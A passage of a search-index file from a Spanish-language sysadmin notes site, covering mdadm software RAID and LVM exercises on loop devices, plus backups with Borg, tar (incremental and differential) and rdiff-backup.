los superbloques build crea la raid sin a\u00f1adir la marca de superbloque al disco create crea la raid a\u00f1adiendo superbloques en sus discos","title":"Raid software"},{"location":"seguridad/raid/#niveles-de-raid","text":"Calculadora raid Nivel n\u00ba discos n\u00ba discos que pueden fallar capacidad capacidad leer y escribir R0 2 0 100% excelente R1 2 max 1 50% L.MuyBuena / E.Buena R5 3 min 1 67% - 94% L.Muy buena / E.Buena R6 4 min 2 50% - 88% L.Buena / E.Buena R10 4 min 1 por cada mirror 50% L.Muy buena / E.Buena R50 6 min 1 por cada mirror 67% - 94% L.Excelente / E.Muy buena R60 8 min 2 por cada mirror 50% - 88% L.Muy buena / E.Buena","title":"Niveles de raid"},{"location":"seguridad/raid/#raid-0","text":"Escribe y lee en los discos a la vez reparti\u00e9ndose la faena, resultado una escritura y lectura excelente. Lo malo que no tiene margen de error, si falla un disco pierdes los datos.","title":"Raid 0"},{"location":"seguridad/raid/#raid-1","text":"Escribe en los 2 discos a la vez por si falla 1 tener el otro de backup.","title":"Raid 1"},{"location":"seguridad/raid/#raid-5","text":"Hace una paridad de datos cada 2 bits genera un tercero de seguridad por si falla alg\u00fan disco.","title":"Raid 5"},{"location":"seguridad/raid/#raid-6","text":"Hace lo mismo que raid 5 pero generando 2 bits de paridad, por lo tanto hay posibilidad de que fallen 2 discos sin perder datos.","title":"Raid 6"},{"location":"seguridad/raid/#raid-10","text":"Son dos raid 1 unidas por una raid 0 , nivel de seguridad alto 1 disco por mirror pero se reduce la capacidad total de almacenamiento al 50% total.","title":"Raid 10"},{"location":"seguridad/raid/#raid-50","text":"Dos raid 5 unidas por raid 0 velocidad excelente de lectura con nivel de seguridad alto de 2 discos de fallo.","title":"Raid 50"},{"location":"seguridad/raid/#raid-60","text":"Dos raid 6 unidas por raid 0 m\u00e1xima seguridad en raid posibilidad de que fallen 4 discos dos por cada raid 6. una probabilidad muy peque\u00f1a.","title":"Raid 60"},{"location":"seguridad/raid/#crear-raid","text":"sudo mdadm --create /dev/md0 --level = 1 --raid-devices = 3 /dev/loop0 /dev/loop1 /dev/loop2 sudo mdadm --create /dev/md/dades --level = 1 --raid-devices = 2 /dev/loop0 /dev/loop1 --spare-devices = 2 /dev/loop2 /dev/loop3 Al crear la raid inserta un peque\u00f1o bloque de datos en cada disco para gestionar la raid.","title":"Crear raid"},{"location":"seguridad/raid/#ver-informacion-raid","text":"sudo mdadm --detail /dev/md0 # ver estado del raid sudo mdadm --detail --scan # ver si existe alguna raid sudo mdadm --examine /dev/loop0 # ver datos del bloque raid en disco sudo mdadm --query /dev/loop0 sudo mdadm --query /dev/md0 cat /proc/mdstat # ver estado de raid","title":"Ver Informaci\u00f3n Raid"},{"location":"seguridad/raid/#extraer-disco","text":"sudo mdadm /dev/md0 --fail /dev/loop1 sudo mdadm /dev/md0 --remove /dev/loop1","title":"Extraer disco"},{"location":"seguridad/raid/#anadir-disco","text":"sudo mdadm --manage /dev/md0 --add /dev/loop1 En este paso si los discos de la raid tienen datos, tardara en a\u00f1adirse por que tiene que sincronizarse.","title":"A\u00f1adir disco"},{"location":"seguridad/raid/#anadir-spare","text":"Spare son los discos de reserva, cuando falla un disco de datos, este se empieza a sincronizar autom\u00e1ticamente. sudo mdadm /dev/md0 --add-spare /dev/loop2","title":"A\u00f1adir Spare"},{"location":"seguridad/raid/#parar-raid","text":"Para, parar la raid a de estar desmontada del sistema de archivos. sudo mdadm --stop /dev/md0 # parar raid md0 sudo mdadm --stop --scan # para todas las raid","title":"Parar Raid"},{"location":"seguridad/raid/#guardar-raid","text":"sudo mdadm --examine --scan > /etc/mdadm.conf","title":"Guardar raid"},{"location":"seguridad/raid/#reconstruir-raid","text":"Como se guardan datos de la raid en cada disco es posible reconstruir una raid autom\u00e1ticamente. sudo mdadm --assemble --scan # automatico, si existe /etc/mdadm.conf no escaneara todos los discos. sudo mdadm --assemble /dev/md0 --run /dev/loop0 /dev/loop1 /dev/loop2 # indicando discos sudo mdadm --assemble /dev/md0 # siempre que exista el archivo /etc/mdadm.conf y este md0 dentro","title":"Reconstruir raid"},{"location":"seguridad/raid/#limpiar-superbloque","text":"sudo mdadm --zero-superblock /dev/loop0","title":"Limpiar superbloque"},{"location":"seguridad/raid/#reshape","text":"","title":"Reshape"},{"location":"seguridad/raid/#aumentar-discos","text":"Aumentar a 3 discos y a\u00f1adir el tercero. sudo mdadm --grow /dev/md/raid1 --raid-devices 3 --add /dev/loop2","title":"Aumentar discos"},{"location":"seguridad/raid/#cambiar-nivel-de-raid","text":"De level 1 a level 5, lvel 1 solo puede tener 2 discos. sudo mdadm --grow /dev/md/raid1 --level 5","title":"Cambiar nivel de raid"},{"location":"seguridad/raid/#aumentar-tamano","text":"sudo mdadm --grow /dev/md/raid1 --size = max # si esta montada se tendr\u00e1 que espandir el sistem de ficheros sudo resize2fs /dev/md127","title":"Aumentar tama\u00f1o"},{"location":"seguridad/raid/#raid-y-lvm","text":"Ejercicio practico: un raid 1 de 2v discos de 500 un raid 1 de 2v discos de 500 primer raid crear pv y vg lv de 200 sistema y 300 dades montar incorpoprar al vg el segundo raid incrementar sistema +100 provocar fail raid1 eliminar vel primer raid del vg","title":"Raid y LVM"},{"location":"seguridad/raid/#crear-discos","text":"dd if = /dev/zero of = disc1.img bs = 1k count = 500k dd if = /dev/zero of = disc2.img bs = 1k count = 500k dd if = /dev/zero of = disc3.img bs = 1k count = 500k dd if = /dev/zero of = disc4.img bs = 1k count = 500k losetup /dev/loop0 disc1.img losetup /dev/loop1 disc2.img losetup /dev/loop2 disc3.img losetup /dev/loop3 disc4.img","title":"Crear discos"},{"location":"seguridad/raid/#crear-raids","text":"mdadm --create /dev/md/raid1 --level 1 --raid-devices 2 /dev/loop0 /dev/loop1 mdadm --create /dev/md/raid2 --level 1 --raid-devices 2 /dev/loop2 /dev/loop3","title":"Crear raids"},{"location":"seguridad/raid/#crear-marca-pv-y-vg","text":"pvcreate /dev/md/raid1 pvcreate /dev/md/raid2 vgcreate mydisc /dev/md/raid2","title":"Crear marca PV y VG"},{"location":"seguridad/raid/#crear-lvs","text":"crear montar y a\u00f1adir datos lvcreate -L 200M -n sistema /dev/mydisc lvcreate -L 100M -n dades /dev/mydisc mkfs.ext4 /dev/mydisc/sistema mkfs.ext4 /dev/mydisc/dades mount /dev/mydisc/sistema /mnt/sistema mount /dev/mydisc/dades /mnt/dades cp -r /boot/grub2/ /mnt/sistema/s1 cp -r /boot/grub2/ /mnt/sistema/s2 cp -r /boot/grub2/ /mnt/dades/d1 cp -r /boot/grub2/ /mnt/dades/d2 cp -r /boot/grub2/ /mnt/dades/d3","title":"Crear LVs"},{"location":"seguridad/raid/#extender-vg-a-las-2-raids","text":"vgextend mydisc /dev/md/raid2","title":"Extender VG a las 2 raids"},{"location":"seguridad/raid/#extender-particion-sistemas","text":"lvextend -L +100M /dev/mydisc/sistema resize2fs /dev/mydisc/sistema","title":"Extender  partici\u00f3n sistemas"},{"location":"seguridad/raid/#extraer-raid1-primaria","text":"# probocar fllo en disco mdadm /dev/md/raid1 --fail /dev/loop0 # mover datos al segundo raid pvmove /dev/md/raid1 /dev/md/raid2 # quitar vprimer raid del VG vgreduce mydisc /dev/md/raid1 # parar raid1 mdadm --stop /dev/md/raid1","title":"Extraer raid1 primaria"},{"location":"seguridad/backups/Borg_basico/","text":"Borg b\u00e1sico borg es un gran programa para crear backups aqui muestro lo b\u00e1sico de lo b\u00e1sico, es mucho mas extenso y potente de gran utilidad. instalar sudo dnf install borgbackup crear repo Encriptar el repositorio ( donde se guardaran los backups ) borg init --encryption = repokey /home/users/inf/wism2/ism47787241/backup-borg Sin encriptar y sin password borg init -e none /home/debian/repoborg crear backups Creando primer backup de carpeta borg create /home/users/inf/wism2/ism47787241/backup-borg::primer-backup ~/carpeta ~/carpeta2 Creando segundo backup de carpeta listar backups borg list /home/users/inf/wism2/ism47787241/backup-borg borg list /home/users/inf/wism2/ism47787241/backup-borg::primer-backup borg list /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup Borrar backup espec\u00edfico borg delete /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup borg delete /home/users/inf/wism2/ism47787241/backup-borg restaurar backup borg extract /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup Repositorio remoto borg init user@hostname:/path/to/repo Otra manera de hacerlo remoto, sincronizando carpetas del host remoto y a\u00f1adiendo la repo sshfs user@hostname:/path/to /path/tot borg init /path/to/repo fusermount -u /path/to Backup compression Por defecto compresi\u00f3n 4 rango de compresi\u00f3n de 1-22, 1 poco comprimido 22 m\u00e1xima compresi\u00f3n. borg create \u2013compression zstd,N /path/to/repo::arch ~","title":"Borg b\u00e1sico"},{"location":"seguridad/backups/Borg_basico/#borg-basico","text":"borg es un gran programa para crear backups aqui muestro lo b\u00e1sico de lo b\u00e1sico, es mucho mas extenso y potente de gran utilidad.","title":"Borg b\u00e1sico"},{"location":"seguridad/backups/Borg_basico/#instalar","text":"sudo dnf install borgbackup","title":"instalar"},{"location":"seguridad/backups/Borg_basico/#crear-repo","text":"Encriptar el repositorio ( donde se guardaran los backups ) borg init --encryption = repokey /home/users/inf/wism2/ism47787241/backup-borg Sin encriptar y sin password borg init -e none /home/debian/repoborg","title":"crear repo"},{"location":"seguridad/backups/Borg_basico/#crear-backups","text":"Creando primer backup de carpeta borg create /home/users/inf/wism2/ism47787241/backup-borg::primer-backup ~/carpeta ~/carpeta2 Creando segundo backup de carpeta","title":"crear backups"},{"location":"seguridad/backups/Borg_basico/#listar-backups","text":"borg list /home/users/inf/wism2/ism47787241/backup-borg borg list /home/users/inf/wism2/ism47787241/backup-borg::primer-backup borg list /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup","title":"listar backups"},{"location":"seguridad/backups/Borg_basico/#borrar-backup-especifico","text":"borg delete /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup borg delete /home/users/inf/wism2/ism47787241/backup-borg","title":"Borrar backup espec\u00edfico"},{"location":"seguridad/backups/Borg_basico/#restaurar-backup","text":"borg extract /home/users/inf/wism2/ism47787241/backup-borg::segundo-backup","title":"restaurar backup"},{"location":"seguridad/backups/Borg_basico/#repositorio-remoto","text":"borg init user@hostname:/path/to/repo Otra manera de hacerlo remoto, sincronizando carpetas del host remoto y a\u00f1adiendo la repo sshfs user@hostname:/path/to /path/tot borg init /path/to/repo fusermount -u /path/to","title":"Repositorio remoto"},{"location":"seguridad/backups/Borg_basico/#backup-compression","text":"Por defecto compresi\u00f3n 4 rango de compresi\u00f3n de 1-22, 1 poco comprimido 22 m\u00e1xima compresi\u00f3n. borg create \u2013compression zstd,N /path/to/repo::arch ~","title":"Backup compression"},{"location":"seguridad/backups/Tar/","text":"Tar Opciones b\u00e1sicas -c # comprime -x # descomprime -z # gzip -J # xz -j # bzip2 -p # conserva permisos -h # conservar softlinks -v # muestra informacion vervose -P # conserva ruta absoluta -f # referencia a archivos -t # ver interior tar -u # a\u00f1adir archivo a tar --exclude # Excluir directorio o fichero --delete # borrar ruta del interior del tar Niveles de compresi\u00f3n tar -cpf backup.tar /home/* gzip -1 backup.tar Comprime de nivel 1 m\u00ednima a 9 m\u00e1xima compresi\u00f3n Ruta absoluta Al tener ruta absoluta se restaurara el archivo autom\u00e1ticamente en su destino # Comprimir sudo tar -czpvPf backup-sudoers-ruta-absoluta.tar.gz /etc/sudoers #Visualizar para comprobar: sudo tar -tzpvf backup-sudoers-ruta-absoluta.tar.gz -r--r----- root/root 3337 2015 -09-27 20 :58 etc/sudoers #Descomprimir tar.gz sudo tar -xzpvPf backup-sudoers-ruta-absoluta.tar.gz # ruta absoluta dentro del comprimido tar --transform = \"s,ASIX1,/usr/share/ASIX,\" -czvf paquet-4.tar.gz ASIX1 --show-transformed-names Comprimir diversas rutas Comprimir con ruta relativa es lo mismo que la absoluta sin opci\u00f3n P Creas un archivo con diversas rutas. seleccio.txt /etc/sudoers /etc/httpd/conf/httpd.conf # Comprimes tar -czpvP --files-from = seleccio.txt -f conf-server.tar.gz # ver comprimido tar -tzf conf-server.tar.gz # restaurar tar -xzpvPf conf-server.tar.gz Excluir archivos Se excluir\u00e1n todos los archivos que contengan la palabra top tar -v --exclude = '*Top*' -f SHIELD-ACL-excl-patro.tar.gz SHIELD/ Excluyendo con varios par\u00e1metros. cat > exclusions.txt Misiones SHIELD/AGENTES/OFICINA/Jugar.txt tar -v --exclude-from = exclusions.txt -f SHIELD-ACL-excl-fitxer.tar.gz SHIELD/ Extraer Extraer normal tar -xzpvf SHIELD-ACL.tar.gz Extraer en ruta concreta tar -xzpv -C /home/user/ACLs/ACLs.scripts/test/ -f SHIELD-ACL.tar.gz Extraer solo archivos espec\u00edficos tar -xzpv -C /home/user/ACLs/ACLs.scripts/test/ -f SHIELD-ACL.tar.gz *OFICINA* Extraer solo archivos que coincidan con el patr\u00f3n tar --acls -xzpvf SHIELD-ACL.tar.gz * { fe,et } *.txt A\u00f1adir archivos a un tar Primero descomprimimos de tar.gz a tar gzip -d SHIELD-ACL.tar.gz a\u00f1adimos tar -uvf SHIELD-ACL.tar Fitxer-a-afegir.txt Fitxer-a-afegir2.txt volvemos a comprimir gzip SHIELD-ACL.tar Eliminar archivos del tar Primero descomprimimos de tar.gz a tar gzip -d SHIELD-ACL.tar.gz Eliminamos tar --delete Fitxer-a-eliminar*.txt -f SHIELD-ACL.tar volvemos a comprimir gzip SHIELD-ACL.tar Mostrar progreso Mostrar progreso desde consola: tar -czf - ./Downloads/ | ( pv -p --timer --rate --bytes > backup.tgz ) Mostrar progreso con TUI(Text User Interface): tar -czf - ./Documents/ | ( pv -n > backup.tgz ) 2 > & 1 | dialog --gauge \"Progress\" 10 70 Backups Incrementares y Diferenciales Los 2 parten de un backup completo, la diferencia es que: El Incremental solo guarda la informaci\u00f3n de los cambios desde el ultimo backup, y para restaurar tengo que utilizar todos los backups increm\u00e9ntales + el total. El diferencial guarda los cambios echos a partir del total, para restaurar solo necesito un total y el diferencial. Incremental Suponemos que hago los backups diarios. estructura: . \u251c\u2500\u2500 backups \u2502 \u2514\u2500\u2500 snars \u2514\u2500\u2500 docs \u251c\u2500\u2500 A \u251c\u2500\u2500 B \u251c\u2500\u2500 C \u2514\u2500\u2500 D 3 directories, 4 files Creo un primer backup total debian \u279c tar cvzf backups/total-domingo-03-2019.tgz -g backups/snars/total-domingo-03-2019.snar docs cp backups/snars/total-domingo-03-2019.snar backups/snars/incremental-03-2019.snar La opci\u00f3n -g indica la ubicaci\u00f3n del archivo donde guarda el registro de backups. Lunes al acabar el d\u00eda creo primer incremental. debian \u279c tar cvzf backups/incremental-lunes-03-2019.tgz -g backups/snars/incremental-03-2019.snar docs docs/ docs/E docs/F Observo que han habido cambios y los guarda Martes al fin de d\u00eda lo mismo. debian \u279c tar cvzf backups/incremental-martes-03-2019.tgz -g backups/snars/incremental-03-2019.snar docs docs/ docs/A Han editado A y guarda los cambios Restaurar incremental Para restaurar se tiene que restaurar el total m\u00e1s todos los incrementales hasta el d\u00eda que quieres. Por comodidad restaurare en tmp debian \u279c tree backups # obserbo que backups tengo backups \u251c\u2500\u2500 incremental-lunes-03-2019.tgz \u251c\u2500\u2500 incremental-martes-03-2019.tgz \u251c\u2500\u2500 snars \u2502 \u251c\u2500\u2500 total-domingo-03-2019.snar \u2514\u2500\u2500 incremental-03-2019.snar \u2514\u2500\u2500 total-domingo-03-2019.tgz # restauro el total debian \u279c tar xvzf backups/total-domingo-03-2019.tgz -C /tmp docs/ docs/A docs/B docs/C docs/D 0 directories, 4 files # lunes debian \u279c tar --incremental xvzf backups/incremental-lunes-03-2019.tgz -C /tmp docs/ docs/E docs/F # martes debian \u279c tar --incremental xvzf backups/incremental-martes-03-2019.tgz -C /tmp docs/ docs/A # lo tengo todo debian \u279c pruevas tree /tmp/docs /tmp/docs \u251c\u2500\u2500 A \u251c\u2500\u2500 B \u251c\u2500\u2500 C \u251c\u2500\u2500 D \u251c\u2500\u2500 E \u2514\u2500\u2500 F Diferenciales Diferenciales son m\u00e1s \u00fatiles para cada semana o cada mes. Parto del total anterior. Hago el primer backup de la semana y se guardan todos los cambios de la semana. debian \u279c cp backups/snars/total-domingo-03-2019.snar backups/snars/diferencial-S1.snar debian \u279c tar cvzf backups/dif-semana1-03-2019.tgz docs -g backups/snars/diferencial-S1.snar docs/ docs/E docs/A docs/F tar: docs/D: el fichero no ha cambiado ; no se vuelca tar: docs/C: el fichero no ha cambiado ; no se vuelca En la segunda semana al hacer un diferencial partiendo de principio de mes, se guardan cambios de las 2 semanas. debian \u279c cp backups/snars/total-domingo-03-2019.snar backups/snars/diferencial-S2.snar debian \u279c tar cvzf backups/dif-semana2-03-2019.tgz docs -g backups/snars/diferencial-S2.snarz docs/ docs/E docs/project/ docs/project/Z docs/project/A docs/A docs/F tar: docs/D: el fichero no ha cambiado ; no se vuelca tar: docs/C: el fichero no ha cambiado ; no se vuelca Restaurar diferencial Al restaurar diferenciales solo necesitas un total y el ultimo diferencial. debian \u279c tar --incremental xvvzf backups/total-domingo-03-2019.tgz -C /tmp drwxr-xr-x debian/debian 13 2019 -03-03 13 :21 docs/ -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/A -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/B -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/C -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/D debian \u279c tar --incremental xvvzf backups/dif-semana2-03-2019.tgz -C /tmp drwxr-xr-x debian/debian 0 2019 -03-03 14 :31 docs/ -rw-r--r-- debian/debian 0 2019 -03-03 13 :43 docs/E drwxr-xr-x debian/debian 0 2019 -03-03 14 :25 docs/project/ -rw-r--r-- debian/debian 0 2019 -03-03 14 :25 docs/project/Z -rw-r--r-- debian/debian 0 2019 -03-03 14 :25 docs/project/A -rw-r--r-- debian/debian 0 2019 -03-03 13 :43 docs/F Un gr\u00e1fico de como funcionar\u00eda las restauracioners y desde donde cogen referencia semana1 semana2 + + + | | | | <-----------------------------+ | | | | + + | + + | | | | | | | | +<------------+ | | | | +<--+ | | <-+ | +<-+ | | | | | | | | | <--+ | | +----------------------------------------------+ lu ma lu ma total","title":"Tar"},{"location":"seguridad/backups/Tar/#tar","text":"","title":"Tar"},{"location":"seguridad/backups/Tar/#opciones-basicas","text":"-c # comprime -x # descomprime -z # gzip -J # xz -j # bzip2 -p # conserva permisos -h # conservar softlinks -v # muestra informacion vervose -P # conserva ruta absoluta -f # referencia a archivos -t # ver interior tar -u # a\u00f1adir archivo a tar --exclude # Excluir directorio o fichero --delete # borrar ruta del interior del tar","title":"Opciones b\u00e1sicas"},{"location":"seguridad/backups/Tar/#niveles-de-compresion","text":"tar -cpf backup.tar /home/* gzip -1 backup.tar Comprime de nivel 1 m\u00ednima a 9 m\u00e1xima compresi\u00f3n","title":"Niveles de compresi\u00f3n"},{"location":"seguridad/backups/Tar/#ruta-absoluta","text":"Al tener ruta absoluta se restaurara el archivo autom\u00e1ticamente en su destino # Comprimir sudo tar -czpvPf backup-sudoers-ruta-absoluta.tar.gz /etc/sudoers #Visualizar para comprobar: sudo tar -tzpvf backup-sudoers-ruta-absoluta.tar.gz -r--r----- root/root 3337 2015 -09-27 20 :58 etc/sudoers #Descomprimir tar.gz sudo tar -xzpvPf backup-sudoers-ruta-absoluta.tar.gz # ruta absoluta dentro del comprimido tar --transform = \"s,ASIX1,/usr/share/ASIX,\" -czvf paquet-4.tar.gz ASIX1 --show-transformed-names","title":"Ruta absoluta"},{"location":"seguridad/backups/Tar/#comprimir-diversas-rutas","text":"Comprimir con ruta relativa es lo mismo que la absoluta sin opci\u00f3n P Creas un archivo con diversas rutas. seleccio.txt /etc/sudoers /etc/httpd/conf/httpd.conf # Comprimes tar -czpvP --files-from = seleccio.txt -f conf-server.tar.gz # ver comprimido tar -tzf conf-server.tar.gz # restaurar tar -xzpvPf conf-server.tar.gz","title":"Comprimir diversas rutas"},{"location":"seguridad/backups/Tar/#excluir-archivos","text":"Se excluir\u00e1n todos los archivos que contengan la palabra top tar -v --exclude = '*Top*' -f SHIELD-ACL-excl-patro.tar.gz SHIELD/ Excluyendo con varios par\u00e1metros. cat > exclusions.txt Misiones SHIELD/AGENTES/OFICINA/Jugar.txt tar -v --exclude-from = exclusions.txt -f SHIELD-ACL-excl-fitxer.tar.gz SHIELD/","title":"Excluir archivos"},{"location":"seguridad/backups/Tar/#extraer","text":"Extraer normal tar -xzpvf SHIELD-ACL.tar.gz Extraer en ruta concreta tar -xzpv -C /home/user/ACLs/ACLs.scripts/test/ -f SHIELD-ACL.tar.gz Extraer solo archivos espec\u00edficos tar -xzpv -C /home/user/ACLs/ACLs.scripts/test/ -f SHIELD-ACL.tar.gz *OFICINA* Extraer solo archivos que coincidan con el patr\u00f3n tar --acls -xzpvf SHIELD-ACL.tar.gz * { fe,et } *.txt","title":"Extraer"},{"location":"seguridad/backups/Tar/#anadir-archivos-a-un-tar","text":"Primero descomprimimos de tar.gz a tar gzip -d SHIELD-ACL.tar.gz a\u00f1adimos tar -uvf SHIELD-ACL.tar Fitxer-a-afegir.txt Fitxer-a-afegir2.txt volvemos a comprimir gzip SHIELD-ACL.tar","title":"A\u00f1adir archivos a un tar"},{"location":"seguridad/backups/Tar/#eliminar-archivos-del-tar","text":"Primero descomprimimos de tar.gz a tar gzip -d SHIELD-ACL.tar.gz Eliminamos tar --delete Fitxer-a-eliminar*.txt -f SHIELD-ACL.tar volvemos a comprimir gzip SHIELD-ACL.tar","title":"Eliminar archivos del tar"},{"location":"seguridad/backups/Tar/#mostrar-progreso","text":"Mostrar progreso desde consola: tar -czf - ./Downloads/ | ( pv -p --timer --rate --bytes > backup.tgz ) Mostrar progreso con TUI(Text User Interface): tar -czf - ./Documents/ | ( pv -n > backup.tgz ) 2 > & 1 | dialog --gauge \"Progress\" 10 70","title":"Mostrar progreso"},{"location":"seguridad/backups/Tar/#backups-incrementares-y-diferenciales","text":"Los 2 parten de un backup completo, la diferencia es que: El Incremental solo guarda la informaci\u00f3n de los cambios desde el ultimo backup, y para restaurar tengo que utilizar todos los backups increm\u00e9ntales + el total. El diferencial guarda los cambios echos a partir del total, para restaurar solo necesito un total y el diferencial.","title":"Backups Incrementares y Diferenciales"},{"location":"seguridad/backups/Tar/#incremental","text":"Suponemos que hago los backups diarios. estructura: . \u251c\u2500\u2500 backups \u2502 \u2514\u2500\u2500 snars \u2514\u2500\u2500 docs \u251c\u2500\u2500 A \u251c\u2500\u2500 B \u251c\u2500\u2500 C \u2514\u2500\u2500 D 3 directories, 4 files Creo un primer backup total debian \u279c tar cvzf backups/total-domingo-03-2019.tgz -g backups/snars/total-domingo-03-2019.snar docs cp backups/snars/total-domingo-03-2019.snar backups/snars/incremental-03-2019.snar La opci\u00f3n -g indica la ubicaci\u00f3n del archivo donde guarda el registro de backups. Lunes al acabar el d\u00eda creo primer incremental. debian \u279c tar cvzf backups/incremental-lunes-03-2019.tgz -g backups/snars/incremental-03-2019.snar docs docs/ docs/E docs/F Observo que han habido cambios y los guarda Martes al fin de d\u00eda lo mismo. debian \u279c tar cvzf backups/incremental-martes-03-2019.tgz -g backups/snars/incremental-03-2019.snar docs docs/ docs/A Han editado A y guarda los cambios","title":"Incremental"},{"location":"seguridad/backups/Tar/#restaurar-incremental","text":"Para restaurar se tiene que restaurar el total m\u00e1s todos los incrementales hasta el d\u00eda que quieres. Por comodidad restaurare en tmp debian \u279c tree backups # obserbo que backups tengo backups \u251c\u2500\u2500 incremental-lunes-03-2019.tgz \u251c\u2500\u2500 incremental-martes-03-2019.tgz \u251c\u2500\u2500 snars \u2502 \u251c\u2500\u2500 total-domingo-03-2019.snar \u2514\u2500\u2500 incremental-03-2019.snar \u2514\u2500\u2500 total-domingo-03-2019.tgz # restauro el total debian \u279c tar xvzf backups/total-domingo-03-2019.tgz -C /tmp docs/ docs/A docs/B docs/C docs/D 0 directories, 4 files # lunes debian \u279c tar --incremental xvzf backups/incremental-lunes-03-2019.tgz -C /tmp docs/ docs/E docs/F # martes debian \u279c tar --incremental xvzf backups/incremental-martes-03-2019.tgz -C /tmp docs/ docs/A # lo tengo todo debian \u279c pruevas tree /tmp/docs /tmp/docs \u251c\u2500\u2500 A \u251c\u2500\u2500 B \u251c\u2500\u2500 C \u251c\u2500\u2500 D \u251c\u2500\u2500 E \u2514\u2500\u2500 F","title":"Restaurar incremental"},{"location":"seguridad/backups/Tar/#diferenciales","text":"Diferenciales son m\u00e1s \u00fatiles para cada semana o cada mes. Parto del total anterior. Hago el primer backup de la semana y se guardan todos los cambios de la semana. debian \u279c cp backups/snars/total-domingo-03-2019.snar backups/snars/diferencial-S1.snar debian \u279c tar cvzf backups/dif-semana1-03-2019.tgz docs -g backups/snars/diferencial-S1.snar docs/ docs/E docs/A docs/F tar: docs/D: el fichero no ha cambiado ; no se vuelca tar: docs/C: el fichero no ha cambiado ; no se vuelca En la segunda semana al hacer un diferencial partiendo de principio de mes, se guardan cambios de las 2 semanas. debian \u279c cp backups/snars/total-domingo-03-2019.snar backups/snars/diferencial-S2.snar debian \u279c tar cvzf backups/dif-semana2-03-2019.tgz docs -g backups/snars/diferencial-S2.snarz docs/ docs/E docs/project/ docs/project/Z docs/project/A docs/A docs/F tar: docs/D: el fichero no ha cambiado ; no se vuelca tar: docs/C: el fichero no ha cambiado ; no se vuelca","title":"Diferenciales"},{"location":"seguridad/backups/Tar/#restaurar-diferencial","text":"Al restaurar diferenciales solo necesitas un total y el ultimo diferencial. debian \u279c tar --incremental xvvzf backups/total-domingo-03-2019.tgz -C /tmp drwxr-xr-x debian/debian 13 2019 -03-03 13 :21 docs/ -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/A -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/B -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/C -rw-r--r-- debian/debian 0 2019 -03-03 13 :21 docs/D debian \u279c tar --incremental xvvzf backups/dif-semana2-03-2019.tgz -C /tmp drwxr-xr-x debian/debian 0 2019 -03-03 14 :31 docs/ -rw-r--r-- debian/debian 0 2019 -03-03 13 :43 docs/E drwxr-xr-x debian/debian 0 2019 -03-03 14 :25 docs/project/ -rw-r--r-- debian/debian 0 2019 -03-03 14 :25 docs/project/Z -rw-r--r-- debian/debian 0 2019 -03-03 14 :25 docs/project/A -rw-r--r-- debian/debian 0 2019 -03-03 13 :43 docs/F Un gr\u00e1fico de como funcionar\u00eda las restauracioners y desde donde cogen referencia semana1 semana2 + + + | | | | <-----------------------------+ | | | | + + | + + | | | | | | | | +<------------+ | | | | +<--+ | | <-+ | +<-+ | | | | | | | | | <--+ | | +----------------------------------------------+ lu ma lu ma total","title":"Restaurar diferencial"},{"location":"seguridad/backups/rdiff-backup/","text":"rdiff-backup https://www.merkasys.com/rdiff-backup-como-hacer-copias-de-seguridad/ backup en cron /etc/crontab # Fem el backup incremental a nivell de blocs 25 23 * * * root /usr/bin/rdiff-backup /opt/vimet /mnt/backup/vimet/rdiff > /tmp/rdiff.log 2 > & 1 # Elimina els backups m\u00e9s antics de dues setmanes 45 22 * * * root /usr/bin/rdiff-backup --remove-older-than 2W /mnt/backup/vimet/rdiff crear backup backup local rdiff-backup /opt/vimet /mnt/backup/vimet/rdiff > /tmp/rdiff.log a servidor externo rdiff-backup /home/webs copias@osiris::/backups/webs Para hacer una copia entre dos servidores: rdiff-backup usuario1@servidor1::/home/webs usuario2@servidor2::/backups/webs El siguiente comando copiar\u00e1 por ejemplo /usr/local/bin pero no /usr/bin rdiff-backup \u2013include /usr/local \u2013exclude /usr / /backups Ahora queremos copiar todo el sistema excluyendo /proc, /sys, /tmp y /backups: rdiff-backup \u2013exclude /proc \u2013exclude /sys \u2013exclude /tmp \u2013exclude /backups / /backups Notas: Si elegimos copiar todo el sistema agregar siempre un \u2013exclude con el directorio donde se van a realizar las copias. Utilizando \u201cextended shell globbing patterns\u201d . Adem\u00e1s de los directorios que se excluyen del ejemplo anterior, excluiremos todos los ficheros que terminen en jpg: rdiff-backup \u2013exclude /proc \u2013exclude /sys \u2013exclude /tmp \u2013exclude \u2018**jpg\u2019 \u2013exclude /backups / /backups Las comillas simples en los ** son muy importantes para que no los interprete la shell. rdiff-backup tambi\u00e9n nos da la posibilidad de escribir en un fichero lo que queremos copiar. Para ello necesitamos usar la opci\u00f3n \u2013include-list . Hay que escribir una l\u00ednea por fichero/directorio. Si el fichero contiene las l\u00edneas: /etc /home Entonces tendremos que ejecutar: rdiff-backup \u2013include-filelist fichero-list.txt \u2013exclude \u2018**\u2019 / /backups Importante agregar el exclude \u2018 \u2019 para que solo copie lo que hemos indicado en el fichero y excluya el resto. Recordemos que el directorio de origen que indicamos es /. Con la opci\u00f3n \u2013include-globbing-filelist nos permite indicar un fichero donde podemos escribir patrones. Debemos a\u00f1adir una l\u00ednea por patr\u00f3n pudiendo utilizar el car\u00e1cter + para indicar las inclusiones y el car\u00e1cter \u2013 para las exclusiones. - **jpg \u2013 /home/*/Trash + /etc + /home \u2013 ** Con esta configuraci\u00f3n exclu\u00edmos los ficheros que terminen en jpg y la carpeta Trash de todas las carpetas de /home e incluiremos /etc y /home. Para utilizar este fichero ejecutaremos: rdiff-backup \u2013include-globbing-filelist fichero-list.txt / /backups Se utiliza la opci\u00f3n \u2013include-globbing-filelist y no \u2013include-filelist para que reconozca los patrones. Si us\u00e1ramos \u2013include-filelist entender\u00eda los * como propios del nombre del fichero. Antes de terminar este apartado quiero comentar que con la opci\u00f3n \u2013include-globbing-filelist se pueden mezclar l\u00edneas con patrones o sin ellos y l\u00edneas con exclusiones o sin ellas. Es decir, sin los caracteres + o -: -**jpg \u2013 /home/*/Trash \u2013 /usr/local/games /usr/local + /etc + /home \u2013 